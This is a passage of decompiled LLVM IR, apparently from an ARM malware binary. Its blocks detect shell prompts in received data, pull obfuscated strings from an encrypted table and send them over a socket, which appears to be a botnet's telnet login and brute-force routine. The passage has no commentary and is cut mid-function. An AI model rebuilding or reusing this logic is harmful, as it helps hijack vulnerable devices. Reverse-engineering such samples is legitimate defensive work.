  store i1 %v3_fe44, i1* %cpsr_c.global-to-local, align 1
  %v8_fe44 = icmp eq i8 %v3_fe3c, 58
  store i1 %v8_fe44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fe44, label %dec_label_pc_101c8, label %dec_label_pc_fe4c

dec_label_pc_fe4c:                                ; preds = %bb450
  %v2_fe4c = icmp ugt i8 %v3_fe3c, 35
  store i1 %v2_fe4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe4c = icmp eq i8 %v3_fe3c, 36
  store i1 %v7_fe4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe4c, label %dec_label_pc_101c8, label %dec_label_pc_fe54

dec_label_pc_fe54:                                ; preds = %dec_label_pc_fe4c
  %v2_fe54 = icmp ugt i8 %v3_fe3c, 34
  store i1 %v2_fe54, i1* %cpsr_c.global-to-local, align 1
  %v7_fe54 = icmp eq i8 %v3_fe3c, 35
  store i1 %v7_fe54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe54, label %dec_label_pc_101c8, label %dec_label_pc_fe8c.preheader

dec_label_pc_fe8c.preheader:                      ; preds = %dec_label_pc_fe54
  %v3_fe58 = add i32 %v0_f79c, 28
  %v2_fe5c = add i32 %v3_fe58, %v3_fe28
  store i32 %v2_fe5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe8c

dec_label_pc_fe68:                                ; preds = %dec_label_pc_fe8c
  %v1_fe68 = add i32 %v0_fe84, -2
  %v2_fe68 = inttoptr i32 %v1_fe68 to i8*
  %v3_fe68 = load i8, i8* %v2_fe68, align 1
  %v4_fe68 = zext i8 %v3_fe68 to i32
  store i32 %v4_fe68, i32* %r2.global-to-local, align 4
  %v2_fe6c = icmp ugt i8 %v3_fe68, 61
  store i1 %v2_fe6c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe6c = icmp eq i8 %v3_fe68, 62
  store i1 %v7_fe6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe6c, label %dec_label_pc_101c8, label %bb451

bb451:                                            ; preds = %dec_label_pc_fe68
  %v3_fe70 = icmp ugt i8 %v3_fe68, 57
  store i1 %v3_fe70, i1* %cpsr_c.global-to-local, align 1
  %v8_fe70 = icmp eq i8 %v3_fe68, 58
  store i1 %v8_fe70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fe70, label %dec_label_pc_101c8, label %dec_label_pc_fe78

dec_label_pc_fe78:                                ; preds = %bb451
  %v2_fe78 = icmp ugt i8 %v3_fe68, 35
  store i1 %v2_fe78, i1* %cpsr_c.global-to-local, align 1
  %v7_fe78 = icmp eq i8 %v3_fe68, 36
  store i1 %v7_fe78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe78, label %dec_label_pc_101c8, label %dec_label_pc_fe80

dec_label_pc_fe80:                                ; preds = %dec_label_pc_fe78
  %v2_fe80 = icmp ugt i8 %v3_fe68, 34
  store i1 %v2_fe80, i1* %cpsr_c.global-to-local, align 1
  %v7_fe80 = icmp eq i8 %v3_fe68, 35
  store i1 %v7_fe80, i1* %cpsr_z.global-to-local, align 1
  %v1_fe84 = add i32 %v0_fe84, -1
  store i32 %v1_fe84, i32* %r3.global-to-local, align 4
  br i1 %v7_fe80, label %dec_label_pc_101c8, label %dec_label_pc_fe8c

dec_label_pc_fe8c:                                ; preds = %dec_label_pc_fe8c.preheader, %dec_label_pc_fe80
  %v0_fe84 = phi i32 [ %v2_fe5c, %dec_label_pc_fe8c.preheader ], [ %v1_fe84, %dec_label_pc_fe80 ]
  %v0_fe8c = phi i32 [ %v1_fe2c, %dec_label_pc_fe8c.preheader ], [ %v1_fe8c, %dec_label_pc_fe80 ]
  %v1_fe8c = add i32 %v0_fe8c, -1
  store i32 %v1_fe8c, i32* %r1.global-to-local, align 4
  %v2_fe8c = icmp ne i32 %v0_fe8c, 0
  store i1 %v2_fe8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe8c = icmp eq i32 %v0_fe8c, 1
  store i1 %v7_fe8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe8c, label %dec_label_pc_fe94, label %dec_label_pc_fe68

dec_label_pc_fe94:                                ; preds = %dec_label_pc_fe8c, %dec_label_pc_fe28
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_fe98 = call i32 @table_unlock_val(i32 30)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_fea8 = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  %v3_feac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fea8, i32* %r2.global-to-local, align 4
  %v1_feb4 = add i32 %v3_feac, -1
  store i32 %v1_feb4, i32* %r3.global-to-local, align 4
  %v0_feb8 = load i32, i32* @fp, align 4
  store i32 %v0_feb8, i32* %r0.global-to-local, align 4
  %v0_febc = load i32, i32* @r6, align 4
  %v1_febc = add i32 %v0_febc, 24
  %v2_febc = inttoptr i32 %v1_febc to i32*
  %v3_febc = load i32, i32* %v2_febc, align 4
  store i32 %v3_febc, i32* %r1.global-to-local, align 4
  %v4_fec0 = call i32 @util_memsearch(i32 %v0_feb8, i32 %v3_febc, i32 %v3_fea8, i32 %v1_feb4)
  store i32 %v4_fec0, i32* %r0.global-to-local, align 4
  %v1_fec4 = add i32 %v4_fec0, 1
  store i32 %v1_fec4, i32* @r7, align 4
  %v2_fec4 = icmp eq i32 %v4_fec0, -1
  store i1 %v2_fec4, i1* %cpsr_c.global-to-local, align 1
  %v7_fec4 = icmp eq i32 %v1_fec4, 0
  store i1 %v7_fec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fec4, label %dec_label_pc_1047c.loopexit, label %dec_label_pc_fed4

dec_label_pc_fed4:                                ; preds = %dec_label_pc_fe94
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_fed8 = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fedc

dec_label_pc_fedc:                                ; preds = %dec_label_pc_101c8, %dec_label_pc_fed4
  %storemerge = phi i32 [ %v1_fed8, %dec_label_pc_fed4 ], [ %v1_101d0, %dec_label_pc_101c8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_fedc = load i32, i32* @r6, align 4
  %v1_fedc = inttoptr i32 %v0_fedc to i32*
  %v2_fedc = load i32, i32* %v1_fedc, align 4
  store i32 %v2_fedc, i32* %r3.global-to-local, align 4
  %v1_fee0 = add i32 %v0_fedc, 4
  %v2_fee0 = inttoptr i32 %v1_fee0 to i32*
  %v3_fee0 = load i32, i32* %v2_fee0, align 4
  store i32 %v3_fee0, i32* %r0.global-to-local, align 4
  %v1_fee4 = add i32 %v2_fedc, 13
  %v2_fee4 = inttoptr i32 %v1_fee4 to i8*
  %v3_fee4 = load i8, i8* %v2_fee4, align 1
  %v4_fee4 = zext i8 %v3_fee4 to i32
  store i32 %v4_fee4, i32* %r2.global-to-local, align 4
  %v1_fee8 = add i32 %v2_fedc, 4
  %v2_fee8 = inttoptr i32 %v1_fee8 to i32*
  %v3_fee8 = load i32, i32* %v2_fee8, align 4
  store i32 %v3_fee8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fef0 = call i32 @__libc_send(i32 %v3_fee0, i32 %v3_fee8, i32 %v4_fee4, i32 16384)
  store i32 %v4_fef0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fef8 = load i32, i32* @r6, align 4
  %v1_fef8 = add i32 %v0_fef8, 4
  %v2_fef8 = inttoptr i32 %v1_fef8 to i32*
  %v3_fef8 = load i32, i32* %v2_fef8, align 4
  store i32 %v3_fef8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_ff04 = call i32 @__libc_send(i32 %v3_fef8, i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32 2, i32 16384)
  store i32 %v4_ff04, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_ff0c = load i32, i32* @r6, align 4
  %v2_ff0c = add i32 %v1_ff0c, 12
  %v3_ff0c = inttoptr i32 %v2_ff0c to i32*
  store i32 5, i32* %v3_ff0c, align 4
  br label %dec_label_pc_f964

dec_label_pc_ff14:                                ; preds = %dec_label_pc_f79c
  %v1_ff14 = add i32 %v0_f79c, 24
  %v2_ff14 = inttoptr i32 %v1_ff14 to i32*
  %v3_ff14 = load i32, i32* %v2_ff14, align 4
  store i32 %v3_ff14, i32* %r2.global-to-local, align 4
  %v1_ff18 = add i32 %v3_ff14, -1
  store i32 %v1_ff18, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff1c = icmp eq i32 %v1_ff18, 0
  store i1 %v2_ff1c, i1* %cpsr_z.global-to-local, align 1
  %tmp452 = icmp slt i32 %v1_ff18, 1
  br i1 %tmp452, label %dec_label_pc_f71c.backedge.thread, label %dec_label_pc_ff24

dec_label_pc_ff24:                                ; preds = %dec_label_pc_ff14
  %v2_ff24 = add i32 %v1_ff18, %v0_f79c
  store i32 %v2_ff24, i32* %r3.global-to-local, align 4
  %v1_ff28 = add i32 %v2_ff24, 28
  %v2_ff28 = inttoptr i32 %v1_ff28 to i8*
  %v3_ff28 = load i8, i8* %v2_ff28, align 1
  %v4_ff28 = zext i8 %v3_ff28 to i32
  store i32 %v4_ff28, i32* %r3.global-to-local, align 4
  %v2_ff2c = icmp ugt i8 %v3_ff28, 61
  store i1 %v2_ff2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff2c = icmp eq i8 %v3_ff28, 62
  store i1 %v7_ff2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff2c, label %dec_label_pc_ff90, label %bb453

bb453:                                            ; preds = %dec_label_pc_ff24
  %v3_ff30 = icmp ugt i8 %v3_ff28, 57
  store i1 %v3_ff30, i1* %cpsr_c.global-to-local, align 1
  %v8_ff30 = icmp eq i8 %v3_ff28, 58
  store i1 %v8_ff30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff30, label %dec_label_pc_ff90, label %dec_label_pc_ff38

dec_label_pc_ff38:                                ; preds = %bb453
  %v2_ff38 = icmp ugt i8 %v3_ff28, 35
  store i1 %v2_ff38, i1* %cpsr_c.global-to-local, align 1
  %v7_ff38 = icmp eq i8 %v3_ff28, 36
  store i1 %v7_ff38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff38, label %dec_label_pc_ff90, label %dec_label_pc_ff40

dec_label_pc_ff40:                                ; preds = %dec_label_pc_ff38
  %v2_ff40 = icmp ugt i8 %v3_ff28, 34
  store i1 %v2_ff40, i1* %cpsr_c.global-to-local, align 1
  %v7_ff40 = icmp eq i8 %v3_ff28, 35
  store i1 %v7_ff40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff40, label %dec_label_pc_ff90, label %dec_label_pc_ff48

dec_label_pc_ff48:                                ; preds = %dec_label_pc_ff40
  %v2_ff48 = icmp ugt i8 %v3_ff28, 36
  store i1 %v2_ff48, i1* %cpsr_c.global-to-local, align 1
  %v7_ff48 = icmp eq i8 %v3_ff28, 37
  store i1 %v7_ff48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff48, label %dec_label_pc_ff90, label %dec_label_pc_ff78.preheader

dec_label_pc_ff78.preheader:                      ; preds = %dec_label_pc_ff48
  %v3_ff4c = add i32 %v0_f79c, 28
  %v2_ff50 = add i32 %v3_ff4c, %v3_ff14
  store i32 %v2_ff50, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff78

dec_label_pc_ff5c:                                ; preds = %bb454
  %v2_ff5c = icmp ugt i8 %v3_ff80, 35
  store i1 %v2_ff5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff5c = icmp eq i8 %v3_ff80, 36
  store i1 %v7_ff5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff5c, label %dec_label_pc_ff90, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff5c
  %v2_ff64 = icmp ugt i8 %v3_ff80, 34
  store i1 %v2_ff64, i1* %cpsr_c.global-to-local, align 1
  %v7_ff64 = icmp eq i8 %v3_ff80, 35
  store i1 %v7_ff64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff64, label %dec_label_pc_ff90, label %dec_label_pc_ff6c

dec_label_pc_ff6c:                                ; preds = %dec_label_pc_ff64
  %v2_ff6c = icmp ugt i8 %v3_ff80, 36
  store i1 %v2_ff6c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff6c = icmp eq i8 %v3_ff80, 37
  store i1 %v7_ff6c, i1* %cpsr_z.global-to-local, align 1
  %v1_ff70 = add i32 %v0_ff70, -1
  store i32 %v1_ff70, i32* %r3.global-to-local, align 4
  br i1 %v7_ff6c, label %dec_label_pc_ff90, label %dec_label_pc_ff78

dec_label_pc_ff78:                                ; preds = %dec_label_pc_ff78.preheader, %dec_label_pc_ff6c
  %v0_ff70 = phi i32 [ %v2_ff50, %dec_label_pc_ff78.preheader ], [ %v1_ff70, %dec_label_pc_ff6c ]
  %v0_ff78 = phi i32 [ %v1_ff18, %dec_label_pc_ff78.preheader ], [ %v1_ff78, %dec_label_pc_ff6c ]
  %v1_ff78 = add i32 %v0_ff78, -1
  store i32 %v1_ff78, i32* %r1.global-to-local, align 4
  %v2_ff78 = icmp ne i32 %v0_ff78, 0
  store i1 %v2_ff78, i1* %cpsr_c.global-to-local, align 1
  %v7_ff78 = icmp eq i32 %v0_ff78, 1
  store i1 %v7_ff78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff78, label %dec_label_pc_f71c.backedge.thread565, label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ff78
  %v1_ff80 = add i32 %v0_ff70, -2
  %v2_ff80 = inttoptr i32 %v1_ff80 to i8*
  %v3_ff80 = load i8, i8* %v2_ff80, align 1
  %v4_ff80 = zext i8 %v3_ff80 to i32
  store i32 %v4_ff80, i32* %r2.global-to-local, align 4
  %v2_ff84 = icmp ugt i8 %v3_ff80, 61
  store i1 %v2_ff84, i1* %cpsr_c.global-to-local, align 1
  %v7_ff84 = icmp eq i8 %v3_ff80, 62
  store i1 %v7_ff84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff84, label %dec_label_pc_ff90, label %bb454

bb454:                                            ; preds = %dec_label_pc_ff80
  %v3_ff88 = icmp ugt i8 %v3_ff80, 57
  store i1 %v3_ff88, i1* %cpsr_c.global-to-local, align 1
  %v8_ff88 = icmp eq i8 %v3_ff80, 58
  store i1 %v8_ff88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff88, label %dec_label_pc_ff90, label %dec_label_pc_ff5c

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff80, %bb454, %dec_label_pc_ff6c, %dec_label_pc_ff64, %dec_label_pc_ff5c, %dec_label_pc_ff48, %dec_label_pc_ff24, %dec_label_pc_ff40, %dec_label_pc_ff38, %bb453
  %v0_ff94 = phi i32 [ %v1_ff18, %dec_label_pc_ff48 ], [ %v1_ff18, %dec_label_pc_ff24 ], [ %v1_ff18, %dec_label_pc_ff40 ], [ %v1_ff18, %dec_label_pc_ff38 ], [ %v1_ff18, %bb453 ], [ %v1_ff78, %dec_label_pc_ff5c ], [ %v1_ff78, %dec_label_pc_ff64 ], [ %v1_ff78, %dec_label_pc_ff6c ], [ %v1_ff78, %bb454 ], [ %v1_ff78, %dec_label_pc_ff80 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_ff94 = add i32 %v0_ff94, 1
  store i32 %v1_ff94, i32* @r7, align 4
  %v1_ff98 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_ffa8 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_ffa8, i32* %r0.global-to-local, align 4
  %v3_ffac = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ffac, i32* %r2.global-to-local, align 4
  store i32 %v3_ffa8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ffb8 = load i32, i32* @r6, align 4
  %v1_ffb8 = add i32 %v0_ffb8, 4
  %v2_ffb8 = inttoptr i32 %v1_ffb8 to i32*
  %v3_ffb8 = load i32, i32* %v2_ffb8, align 4
  store i32 %v3_ffb8, i32* %r0.global-to-local, align 4
  %v4_ffbc = call i32 @__libc_send(i32 %v3_ffb8, i32 %v3_ffa8, i32 %v3_ffac, i32 16384)
  store i32 %v4_ffbc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ffcc = load i32, i32* @r6, align 4
  %v1_ffcc = add i32 %v0_ffcc, 4
  %v2_ffcc = inttoptr i32 %v1_ffcc to i32*
  %v3_ffcc = load i32, i32* %v2_ffcc, align 4
  store i32 %v3_ffcc, i32* %r0.global-to-local, align 4
  %v4_ffd0 = call i32 @__libc_send(i32 %v3_ffcc, i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_ffd8 = call i32 @table_lock_val(i32 6)
  store i32 %v1_ffd8, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_ffe0 = load i32, i32* @r6, align 4
  %v2_ffe0 = add i32 %v1_ffe0, 12
  %v3_ffe0 = inttoptr i32 %v2_ffe0 to i32*
  store i32 8, i32* %v3_ffe0, align 4
  br label %dec_label_pc_f96c

dec_label_pc_ffe8:                                ; preds = %dec_label_pc_f79c
  %v1_ffe8 = add i32 %v0_f79c, 24
  %v2_ffe8 = inttoptr i32 %v1_ffe8 to i32*
  %v3_ffe8 = load i32, i32* %v2_ffe8, align 4
  store i32 %v3_ffe8, i32* %r2.global-to-local, align 4
  %v1_ffec = add i32 %v3_ffe8, -1
  store i32 %v1_ffec, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fff0 = icmp eq i32 %v1_ffec, 0
  store i1 %v2_fff0, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v1_ffec, 1
  br i1 %tmp455, label %dec_label_pc_10064, label %dec_label_pc_fff8

dec_label_pc_fff8:                                ; preds = %dec_label_pc_ffe8
  %v2_fff8 = add i32 %v1_ffec, %v0_f79c
  store i32 %v2_fff8, i32* %r3.global-to-local, align 4
  %v1_fffc = add i32 %v2_fff8, 28
  %v2_fffc = inttoptr i32 %v1_fffc to i8*
  %v3_fffc = load i8, i8* %v2_fffc, align 1
  %v4_fffc = zext i8 %v3_fffc to i32
  store i32 %v4_fffc, i32* %r3.global-to-local, align 4
  %v2_10000 = icmp ugt i8 %v3_fffc, 61
  store i1 %v2_10000, i1* %cpsr_c.global-to-local, align 1
  %v7_10000 = icmp eq i8 %v3_fffc, 62
  store i1 %v7_10000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10000, label %dec_label_pc_1017c, label %bb456

bb456:                                            ; preds = %dec_label_pc_fff8
  %v3_10004 = icmp ugt i8 %v3_fffc, 57
  store i1 %v3_10004, i1* %cpsr_c.global-to-local, align 1
  %v8_10004 = icmp eq i8 %v3_fffc, 58
  store i1 %v8_10004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10004, label %dec_label_pc_1017c, label %dec_label_pc_1000c

dec_label_pc_1000c:                               ; preds = %bb456
  %v2_1000c = icmp ugt i8 %v3_fffc, 35
  store i1 %v2_1000c, i1* %cpsr_c.global-to-local, align 1
  %v7_1000c = icmp eq i8 %v3_fffc, 36
  store i1 %v7_1000c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1000c, label %dec_label_pc_1017c, label %dec_label_pc_10014

dec_label_pc_10014:                               ; preds = %dec_label_pc_1000c
  %v2_10014 = icmp ugt i8 %v3_fffc, 34
  store i1 %v2_10014, i1* %cpsr_c.global-to-local, align 1
  %v7_10014 = icmp eq i8 %v3_fffc, 35
  store i1 %v7_10014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10014, label %dec_label_pc_1017c, label %dec_label_pc_1001c

dec_label_pc_1001c:                               ; preds = %dec_label_pc_10014
  %v2_1001c = icmp ugt i8 %v3_fffc, 36
  store i1 %v2_1001c, i1* %cpsr_c.global-to-local, align 1
  %v7_1001c = icmp eq i8 %v3_fffc, 37
  store i1 %v7_1001c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1001c, label %dec_label_pc_1017c, label %dec_label_pc_1005c.preheader

dec_label_pc_1005c.preheader:                     ; preds = %dec_label_pc_1001c
  %v3_10020 = add i32 %v0_f79c, 28
  %v2_10024 = add i32 %v3_10020, %v3_ffe8
  store i32 %v2_10024, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1005c

dec_label_pc_10030:                               ; preds = %dec_label_pc_1005c
  %v1_10030 = add i32 %v0_10054, -2
  %v2_10030 = inttoptr i32 %v1_10030 to i8*
  %v3_10030 = load i8, i8* %v2_10030, align 1
  %v4_10030 = zext i8 %v3_10030 to i32
  store i32 %v4_10030, i32* %r2.global-to-local, align 4
  %v2_10034 = icmp ugt i8 %v3_10030, 61
  store i1 %v2_10034, i1* %cpsr_c.global-to-local, align 1
  %v7_10034 = icmp eq i8 %v3_10030, 62
  store i1 %v7_10034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10034, label %dec_label_pc_1017c, label %bb457

bb457:                                            ; preds = %dec_label_pc_10030
  %v3_10038 = icmp ugt i8 %v3_10030, 57
  store i1 %v3_10038, i1* %cpsr_c.global-to-local, align 1
  %v8_10038 = icmp eq i8 %v3_10030, 58
  store i1 %v8_10038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10038, label %dec_label_pc_1017c, label %dec_label_pc_10040

dec_label_pc_10040:                               ; preds = %bb457
  %v2_10040 = icmp ugt i8 %v3_10030, 35
  store i1 %v2_10040, i1* %cpsr_c.global-to-local, align 1
  %v7_10040 = icmp eq i8 %v3_10030, 36
  store i1 %v7_10040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10040, label %dec_label_pc_1017c, label %dec_label_pc_10048

dec_label_pc_10048:                               ; preds = %dec_label_pc_10040
  %v2_10048 = icmp ugt i8 %v3_10030, 34
  store i1 %v2_10048, i1* %cpsr_c.global-to-local, align 1
  %v7_10048 = icmp eq i8 %v3_10030, 35
  store i1 %v7_10048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10048, label %dec_label_pc_1017c, label %dec_label_pc_10050

dec_label_pc_10050:                               ; preds = %dec_label_pc_10048
  %v2_10050 = icmp ugt i8 %v3_10030, 36
  store i1 %v2_10050, i1* %cpsr_c.global-to-local, align 1
  %v7_10050 = icmp eq i8 %v3_10030, 37
  store i1 %v7_10050, i1* %cpsr_z.global-to-local, align 1
  %v1_10054 = add i32 %v0_10054, -1
  store i32 %v1_10054, i32* %r3.global-to-local, align 4
  br i1 %v7_10050, label %dec_label_pc_1017c, label %dec_label_pc_1005c

dec_label_pc_1005c:                               ; preds = %dec_label_pc_1005c.preheader, %dec_label_pc_10050
  %v0_10054 = phi i32 [ %v2_10024, %dec_label_pc_1005c.preheader ], [ %v1_10054, %dec_label_pc_10050 ]
  %v0_1005c = phi i32 [ %v1_ffec, %dec_label_pc_1005c.preheader ], [ %v1_1005c, %dec_label_pc_10050 ]
  %v1_1005c = add i32 %v0_1005c, -1
  store i32 %v1_1005c, i32* %r1.global-to-local, align 4
  %v2_1005c = icmp ne i32 %v0_1005c, 0
  store i1 %v2_1005c, i1* %cpsr_c.global-to-local, align 1
  %v7_1005c = icmp eq i32 %v0_1005c, 1
  store i1 %v7_1005c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1005c, label %dec_label_pc_10064, label %dec_label_pc_10030

dec_label_pc_10064:                               ; preds = %dec_label_pc_1005c, %dec_label_pc_ffe8
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_10068 = call i32 @table_unlock_val(i32 31)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_10070 = call i32 @table_unlock_val(i32 32)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_10080 = call i32 @table_retrieve_val(i32 31, i32* nonnull %stack_var_-60)
  store i32 %v3_10080, i32* @r4, align 4
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v3_10094 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-60)
  %v3_10098 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10094, i32* @r5, align 4
  %v0_100a0 = load i32, i32* @r4, align 4
  store i32 %v0_100a0, i32* %r2.global-to-local, align 4
  %v1_100a4 = add i32 %v3_10098, -1
  store i32 %v1_100a4, i32* %r3.global-to-local, align 4
  %v0_100a8 = load i32, i32* @fp, align 4
  store i32 %v0_100a8, i32* %r0.global-to-local, align 4
  %v0_100ac = load i32, i32* @r6, align 4
  %v1_100ac = add i32 %v0_100ac, 24
  %v2_100ac = inttoptr i32 %v1_100ac to i32*
  %v3_100ac = load i32, i32* %v2_100ac, align 4
  store i32 %v3_100ac, i32* %r1.global-to-local, align 4
  %v4_100b0 = call i32 @util_memsearch(i32 %v0_100a8, i32 %v3_100ac, i32 %v0_100a0, i32 %v1_100a4)
  store i32 %v4_100b0, i32* %r0.global-to-local, align 4
  %v2_100b4 = icmp eq i32 %v4_100b0, -1
  store i1 %v2_100b4, i1* %cpsr_c.global-to-local, align 1
  %v7_100b4 = icmp eq i32 %v4_100b0, -1
  store i1 %v7_100b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100b4, label %dec_label_pc_100c4, label %dec_label_pc_100ec

dec_label_pc_100c4:                               ; preds = %dec_label_pc_10064
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_100c4 = load i32, i32* %stack_var_-60, align 4
  %v0_100c8 = load i32, i32* @r5, align 4
  store i32 %v0_100c8, i32* %r2.global-to-local, align 4
  %v1_100cc = add i32 %v3_100c4, -1
  store i32 %v1_100cc, i32* %r3.global-to-local, align 4
  %v0_100d0 = load i32, i32* @fp, align 4
  store i32 %v0_100d0, i32* %r0.global-to-local, align 4
  %v0_100d4 = load i32, i32* @r6, align 4
  %v1_100d4 = add i32 %v0_100d4, 24
  %v2_100d4 = inttoptr i32 %v1_100d4 to i32*
  %v3_100d4 = load i32, i32* %v2_100d4, align 4
  store i32 %v3_100d4, i32* %r1.global-to-local, align 4
  %v4_100d8 = call i32 @util_memsearch(i32 %v0_100d0, i32 %v3_100d4, i32 %v0_100c8, i32 %v1_100cc)
  store i32 %v4_100d8, i32* %r0.global-to-local, align 4
  %v1_100dc = add i32 %v4_100d8, 1
  store i32 %v1_100dc, i32* @r7, align 4
  %v2_100dc = icmp eq i32 %v4_100d8, -1
  store i1 %v2_100dc, i1* %cpsr_c.global-to-local, align 1
  %v7_100dc = icmp eq i32 %v1_100dc, 0
  store i1 %v7_100dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_100dc, label %dec_label_pc_1048c, label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_100c4, %dec_label_pc_10064
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_100f0 = call i32 @table_lock_val(i32 31)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_100f8 = call i32 @table_lock_val(i32 32)
  store i32 %v1_100f8, i32* %r0.global-to-local, align 4
  %v0_100fc = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100fc = icmp eq i32 %v0_100fc, 0
  store i1 %v2_100fc, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_100fc, 1
  br i1 %tmp458, label %dec_label_pc_f964, label %dec_label_pc_10190

dec_label_pc_10108:                               ; preds = %dec_label_pc_faac
  store i32 %v2_1010c, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_19b6c.209 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_1010c, i32* @r0, align 4
  store i32 %v2_10120, i32* @sl, align 4
  %v0_10124 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_10120, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19b63.211 to i32), i32* @r1, align 4
  %v0_10134 = call i32 @memcpy()
  store i32 %v0_10134, i32* %r0.global-to-local, align 4
  %v0_10138 = load i32, i32* @r6, align 4
  %v1_10138 = add i32 %v0_10138, 24
  %v2_10138 = inttoptr i32 %v1_10138 to i32*
  %v3_10138 = load i32, i32* %v2_10138, align 4
  %v0_1013c = load i32, i32* @r4, align 4
  %v1_1013c = add i32 %v0_1013c, 2
  store i32 %v1_1013c, i32* %r2.global-to-local, align 4
  %v0_10140 = load i32, i32* @fp, align 4
  %v2_10140 = add i32 %v0_10140, %v3_10138
  store i32 %v2_10140, i32* @r3, align 4
